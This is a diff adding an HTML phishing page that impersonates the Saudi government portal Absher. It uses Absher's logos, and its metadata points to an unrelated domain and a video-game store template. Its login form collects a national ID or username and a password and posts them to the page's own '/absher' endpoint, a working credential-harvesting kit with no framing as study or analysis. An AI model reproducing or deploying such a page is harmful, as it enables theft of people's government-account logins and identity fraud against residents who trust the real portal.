@@ -1,0 +1,391 @@
+<!doctype html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <title> أبشر</title>
+     <meta name="description"
+        content="ابشر للخدمات الالكترونية">
+    <link rel="icon"
+        href="https://www.absher.sa/portal/individuals/images/absher-logo-print.png">
+    <link rel="shortcut icon"
+        href="https://www.absher.sa/portal/individuals/images/absher-logo-print.png"
+        type="image/x-icon">
+    <link rel="apple-touch-icon"
+        href="https://www.absher.sa/portal/individuals/images/absher-logo-print.png">
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="أبشر">
+    <meta name="twitter:title" content="أبشر">
+    <meta name="twitter:url" content="https://alhaddad.ccc/">
+    <meta name="twitter:description"
+        content="اكسسوارات اجهزة العاب الفيديو, اجهزة العاب الفيديو, العاب اكس بوكس, العاب بلايستيشن 5, العاب بلايستيشن 4, العاب نينتندو سويتش">
+    <meta name="twitter:image"
+        content="https://www.absher.sa/portal/individuals/images/absher-logo-print.png/">
+
+    <meta property="og:locale" content="ar">
+    <meta property="og:title" content="أبشر">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://alhaddad.ccc/">
+    <meta property="og:description"
+        content="اكسسوارات اجهزة العاب الفيديو, اجهزة العاب الفيديو, العاب اكس بوكس, العاب بلايستيشن 5, العاب بلايستيشن 4, العاب نينتندو سويتش">
+    <meta property="og:image:alt" content="logo">
+    <meta property="og:image"
+        content="https://www.absher.sa/portal/individuals/images/absher-logo-print.png/">
+    <meta property="og:image:width" content="200">
+    <meta property="og:image:height" content="200">
+    <meta property="business:contact_data:website" content="https://alhaddad.ccc/">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <link rel="shortcut icon" type="image/jpg"
+        href="https://www.absher.sa/portal/individuals/images/absher-logo-print.png/">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="../css/css2.css" rel="stylesheet">
+ 
+    <link rel="stylesheet" type="text/css" href="../css/custome.css">
+    <link rel="stylesheet" type="text/css" href="../css/cart.css">
+    <link rel="stylesheet" type="text/css" href="../css/product-details.css">
+    <link rel="stylesheet" type="text/css" href="../css/icomoon.css">
+    <link rel="stylesheet" type="text/css" href="../css/bootstrap-rtl.css">
+    <link rel="stylesheet" type="text/css" href="../css/bootstrap-fixes.css">
+    <link rel="stylesheet" type="text/css" href="../css/jquery-ui.min.css">
+    <link rel="stylesheet" type="text/css" href="../css/jquery-ui.structure.min.css">
+    <link rel="stylesheet" type="text/css" href="../css/jquery-ui.theme.min.css">
+    <link rel="stylesheet" type="text/css" href="../css/slick.css">
+    <link rel="stylesheet" type="text/css" href="../css/slick-theme.css">
+    <link rel="stylesheet" type="text/css" href="../css/slide-menu.css">
+    <link rel="stylesheet" type="text/css" href="../css/slide-menu-style.css">
+    <link rel="stylesheet" href="../css/main.css">
+    <link rel="stylesheet" type="text/css" href="../css/custom.css">
+    <link rel="stylesheet" href="../css/main.rtl.css">
+    
+     
+ </head>
+
+<body class="rtl" data-template="home">
+    <style>
+        .sprites:after {
+            content: '';
+            display: inline-block;
+            background-repeat: no-repeat;
+            vertical-align: middle;
+        }
+        .sprite-logingreen::after {
+            width: 32px;
+            height: 32px;
+            background-position: 0 -776px;
+        }
+        .sprites:after, .footer .list-social a:after {
+            background-image: url(../images/sprites.png?v=18122022);
+        }
+        .rtl .left-side .login-title {
+            padding: 0 10px 0 0;
+            background-position: 97% 9px;
+            border-right: 4px solid #9af185;
+            border-left: 0;
+        }
+        .left-side .login-title {
+            background-color: #fff;
+            height: 60px;
+            width: auto;
+            margin-top: 0;
+            margin-bottom: 0;
+            line-height: 60px;
+            vertical-align: middle;
+            padding: 0 0 0 10px;
+            border-bottom: 1px solid rgba(229,229,229,0.5);
+            border-left: 4px solid #9af185;
+            font-weight: bold;
+            font-size: 14px;
+            position: relative;
+        }
+
+         
+        .log-div{
+            border: 1px solid #dbdbdb;
+            box-shadow: rgba(0, 0, 0, 0.15) 1.95px 1.95px 2.6px;
+            width: 90%;
+            margin:  0 auto;
+            padding: 2rem;
+        }
+
+         .rtl .col-md-12, .rtl .col-lg-12 {
+            position: relative;
+            min-height: 1px;
+            padding-left: 15px;
+            padding-right: 15px;
+        }
+        .input-container {
+            display: flex;
+            width: 100%;
+            margin: 10px 0 0 0;
+            border:1px solid #dbdbdb;
+            padding: 1rem;
+            
+        }
+        .icon {
+            padding: 10px;
+            background-color: #fff;
+            border: 1px solid #e5e5e5;
+            border-right: 0;
+            border-radius: 5px 0 0 5px;
+            color: #989292;
+            min-width: 40px;
+            text-align: center;
+        }
+        .input-field{
+            width:100%;
+            height:100%
+        }
+
+
+    </style>
+    <style>
+        body,
+        html {
+            font-family: Cairo, sans-serif;
+        }
+
+        :root {
+            --header-primary-color: #00608e;
+
+            --menu-header-primary-color: #ff0000;
+            --header-primary-brightness: brightness(100%);
+
+            --menu-header-text-color-primary-bg: #ffffff;
+
+            --header-text-color-primary-bg: #ffffff;
+            --footer-primary-color: #00608e;
+            --footer-text-color-primary-bg: #ffffff;
+        }
+         
+    </style>
+    <div class="app d-flex flex-column visible">
+        <div class="header">
+            <header section-id="a2320cdf-08f5-4d52-8da2-3203c42b3ec6" class="d-flex flex-column">
+                <div class="account-lang-currency upper-bar header-theme-bg-primary header-theme-text-for-primary-bg">
+                    <div class="container d-flex justify-content-between">
+                        <div class="account-area">
+                            <button type="button"  
+                                class="btn btn-dark account-btn">
+                                <span class="icon-account_circle_black_24dp header-theme-icon-primary"
+                                    style="position: relative; top: 1px"></span>
+                                <span style="position: relative; bottom: 2px">&nbsp;تسجيل الدخول&nbsp;</span>
+                            </button>
+                        </div>
+                        <div class="language-currency d-flex justify-content-between" data-toggle="modal"
+                            data-target="#langCurrecyModal">
+                            <div class="currency-button-area d-flex justify-content-center">
+                                <button class="c-btn currency-btn">السعودية</button>
+                            </div>
+                            <div class="vertical-line"></div>
+                            <div class="language-button-area d-flex justify-content-between">
+                                <button type="submit"
+                                    class="c-btn language-btn d-flex justify-content-between align-items-center">
+                                    <span class="px-2">English</span>&nbsp;
+                                    <span class="icon-language_white"></span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="fixed-header" style="z-index: 3">
+
+                    <div style="z-index: 3">
+                        <div class="search-header header-theme-bg-primary">
+                            <div class="container " style="height:100px; background:#fff;">
+                                <div class="d-flex align-items-center search-header-bar">
+                                    <div class="d-flex align-items-center bd-highlight header-logo">
+                                        
+                                        <a href="/" style="width: auto; height: 100%; display: block">
+                                            <img class="image-logo  d-none d-lg-block "
+                                                src="https://www.absher.sa/portal/individuals/images/absher-logo-print.png" alt="أبشر"
+                                                style="width: auto; max-height: 100%">
+                                            <img class="image-logo d-block d-lg-none"
+                                                src="https://www.absher.sa/portal/individuals/images/absher-logo-print.png" alt="أبشر"
+                                                style="width: auto; max-height: 100%">
+                                        </a>
+                                         <img class="image-logo d-block d-lg-none"
+                                                src="https://www.absher.sa/portal/individuals/images/vission-logo.png?ver=201810081" alt="أبشر"
+                                                style="width: auto; max-height: 100%">
+                                    </div>
+                                    <div
+                                        class="p-2 d-none d-lg-flex align-items-center bd-highlight search-input lg-search-div flex-grow-1" style=" margin-right: 5rem; ">
+                                        <div class="form-group" style="position: relative; margin: 0px">
+                                            <span class="icon-search search-input-icon" style="z-index: 1"></span>
+                                            <div class="autocomplete" style="position: relative">
+                                                <input type="text" data-cat-id class="form-control search-input-input"
+                                                    placeholder="اسم لعبتك بالانجليزي">
+                                                <div class="autocomplete-items"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="bd-highlight d-flex align-items-center justify-content-end header-cart">
+                                        <div class="d-block d-lg-none sm-search-icon">
+                                            <span class="icon-search header-theme-icon-primary"></span>
+                                        </div>
+                                        <div class="d-none d-lg-block">
+                                            <a href="#" style="color: inherit">
+                                                <h3 class="cart-header-total"></h3>
+                                            </a>
+                                        </div>
+                                        <div style="position: relative">
+                                            <a class="a-shopping-cart" href="#" style="color: inherit">
+                                                <span
+                                                    class="icon-shopping_cart_black_36dp-1-1 header-theme-icon-primary"> 
+                                                    <img width="50px" src="https://www.absher.sa/portal/individuals/images/moi_logo.jpg"/></span>
+                                                 
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="position: relative; z-index: -1">
+                        <div class="sm-search-div">
+                            <div class="autocomplete" style="position: relative">
+                                <input type="text" data-cat-id class="form-control search-input-input"
+                                    placeholder="ابحث">
+                                <div class="autocomplete-items"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                 
+                
+                 
+            </header>
+    </div>
+      <div class="log-div">
+            <!-- <div id="login-box" class="service-popup service-popup-medium"> -->
+
+
+
+            
+                    <!-- <div class="wow fadeInDown" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: fadeInDown;"> -->
+                        <h2 class="my-4 login-title logintoggel"><span class="sprites sprite-logingreen"></span> تسجيل الدخول</h2>
+                        <form method="POST" action="/absher" autocomplete="off">  
+                                    <div class="login-input">
+                                        <div class="col-md-12">
+                                            <div class="input-container">
+                                                <i class="icon-user icon"></i>
+                                                <input autofocus="autofocus" placeholder="اسم المستخدم أو رقم الهوية" autocomplete="off" maxlength="30" tabindex="4" id="LoginPortletIDField1" name="id" type="text" class="input-field">							
+                                            </div>
+                                        </div>
+
+                                        <div class="col-md-12">
+                                            <div class="input-container">
+                                                <i class="icon-lock icon"></i>
+                                                <input placeholder="كلمة المرور" autocomplete="off" tabindex="5" maxlength="30" id="LoginPortletSecretField1" name="pass" type="password" class="input-field  ">							
+                                            </div>
+                                        </div>
+
+                                        <div class="col-md-12">
+                                            <div class="input-container">
+                                                    <input type="submit" value="تسجيل الدخول" name="LoginPortletFormSubmit" id="LoginPortletFormSubmit" class="btn btn-default btn-block btn-lg active-login">
+                                            </div>
+                                        </div>
+                                    </div> 
+
+                        </form>
+                    <!-- </div> -->
+
+
+                    
+        </div>
+   
+    <script data-cfasync="false" src="../js/email-decode.min.js"></script>
+    <script type="text/javascript" src="../js/zidapi.min.js"></script>
+    <script>
+        zid.store.initApp('ewogICAgICAgICAgICAgICAgImJhc2VVUkwiOiJodHRwczovL210anJhemV6LmNvbS9hcGkvdjEiLAogICAgICAgICAgICAgICAgImhlYWRlcnMiOm51bGwsCiAgICAgICAgICAgICAgICAic3RvcmVJZCI6MTIyNTc5LAogICAgICAgICAgICAgICAgInBlcm1hbGluayI6Imh0dHBzOi8vbXRqcmF6ZXouY29tLyIsCiAgICAgICAgICAgICAgICAiaXAiOiIiLAogICAgICAgICAgICAgICAgImNhcnRTZXNzaW9uSWQiOiJpd2drMHpEUHJXODQybEd1UkxMcWlnTjBaRWNmd09aTCIsCiAgICAgICAgICAgICAgICAiYXBpQXV0aG9yaXphdGlvbiI6Ik1GZDFiMUk1Y0V4aVNGQllWa3hqYjBGSVZsZFNjRkZ3VDNOa1FrTklURUpQZEhwRU5HZFBOeTR3TkRaa05EVTQiLAogICAgICAgICAgICAgICAgImN1c3RvbWVyVG9rZW4iOm51bGx9')</script>
+    <script>
+        window.appDirection = 'rtl';
+
+        window.loadToasterScriptIfNotLoaded = function (onCompleted) {
+            var list = document.getElementsByTagName('script');
+            var i = list.length, flag = false;
+            while (i--) {
+                if (list[i].src === "https://assets.zid.store/themes/f9f0914d-3c58-493b-bd83-260ed3cb4e82/toastr.min.js") {
+                    flag = true;
+                    break;
+                }
+            }
+
+            if (!flag) {
+                var script = document.createElement('script');
+                script.src = "https://assets.zid.store/themes/f9f0914d-3c58-493b-bd83-260ed3cb4e82/toastr.min.js";
+                document.getElementsByTagName('head')[0].appendChild(script);
+
+                var fileref = document.createElement("link");
+                fileref.rel = "stylesheet";
+                fileref.type = "text/css";
+                fileref.href = "https://assets.zid.store/themes/f9f0914d-3c58-493b-bd83-260ed3cb4e82/toastr.min.css";
+                document.getElementsByTagName("head")[0].appendChild(fileref)
+
+                script.onload = function () {
+                    if (onCompleted)
+                        onCompleted();
+                }
+            } else {
+                if (onCompleted)
+                    onCompleted();
+            }
+        }
+    </script>
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script src="../js/jquery-ui.min.js"></script>
+    <script src="../js/popper.min.js"></script>
+    <script src="../js/bootstrap.min.js"></script>
+    <script src="../js/slide-menu.ie.js"></script>
+    <script src="../js/slick.min.js"></script>
+    <script type="text/javascript" src="../js/main.js"></script>
+    <script>
+        $(window).resize(function () {
+            $('.s-slider').slick('resize');
+        });
+    </script>
+    <script type="text/javascript" src="../js/zid-tracking.min.js"></script>
+    <script>
+
+        if (typeof window.ga === "function") {
+            window.ga('send', 'pageview');
+            window.ga('merchantTracker.send', 'pageview');
+        }
+
+
+        if (typeof window.snaptr === "function") {
+            window.snaptr('track', 'PAGE_VIEW')
+        }
+
+
+        if (typeof window.fbq === "function") {
+            window.fbq('track', 'PageView');
+        }
+
+
+        if (window.PostAffTracker && typeof window.PostAffTracker.track === "function") {
+            window.PostAffTracker.track();
+        }
+
+
+        window.sendProductAddToCartEvent = zidTracking.sendGaProductAddToCartEvent;
+        window.sendProductRemoveFromCartEvent = zidTracking.sendGaProductRemoveFromCartEvent;
+        window.sendGaCartViewCheckoutStepEvent = zidTracking.sendGaCartViewCheckoutStepEvent;
+
+        zidTracking.sendPageViewEvent();
+
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js" integrity="sha512-ubuT8Z88WxezgSqf3RLuNi5lmjstiJcyezx34yIU2gAHonIi27Na7atqzUZCOoY4CExaoFumzOsFQ2Ch+I/HCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="../js/main.js"></script>
+    <script src="../js/bundle.min.js"></script>
+    
+    <script type="text/javascript" src="../js/product_helper_scripts.min.js"></script>
+    <script type="text/javascript" src="../js/products_bundle_offer_tag.min.js"></script>
+    <script type="text/javascript" src="../js/products_donation_availability.min.js"></script>
+</body>
+
+</html>
